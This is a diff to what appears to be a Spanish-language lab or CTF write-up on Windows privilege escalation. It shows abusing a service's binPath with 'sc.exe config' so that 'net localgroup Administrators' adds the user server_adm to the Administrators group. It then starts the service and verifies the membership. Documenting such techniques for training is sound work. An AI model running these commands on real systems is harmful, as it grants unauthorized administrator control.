@@ -377,7 +377,29 @@ sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server
 ```
 <img width="856" height="178" alt="image" src="https://github.com/user-attachments/assets/122b2bce-e233-4431-9bda-92576ecd74ce" />
 
-Vemos que la modificación de la configuración del servicio (binPath) fue aceptada. 
+Vemos que la modificación de la configuración del servicio (binPath) fue aceptada.
+
+Esto significa que cuando intentemos iniciar el servicio, se intentará acceder a la ruta establecida en `binPath`. El servicio no podrá iniciarse, paralelamente se ejecutará el comando establecido, que agrega nuestro usuario `server_adm` al grupo `Administrator`.
+
+
+A continuación intentamos iniciar el servicio usando:
+
+```powershell
+sc.exe start AppReadiness
+```
+<img width="775" height="121" alt="image" src="https://github.com/user-attachments/assets/b41599f9-d6f0-4e8e-81ba-608e7d2572ae" />
+
+Confirmamos la ejecución del comando visualizando la membresia del grupo `Administrators`
+```powershell
+net localgroup Administrators
+```
+<img width="790" height="273" alt="image" src="https://github.com/user-attachments/assets/b2f2d0f2-aaf2-4636-9ce3-1e2817098c1a" />
+
+
+
+
+
+
 
 
 
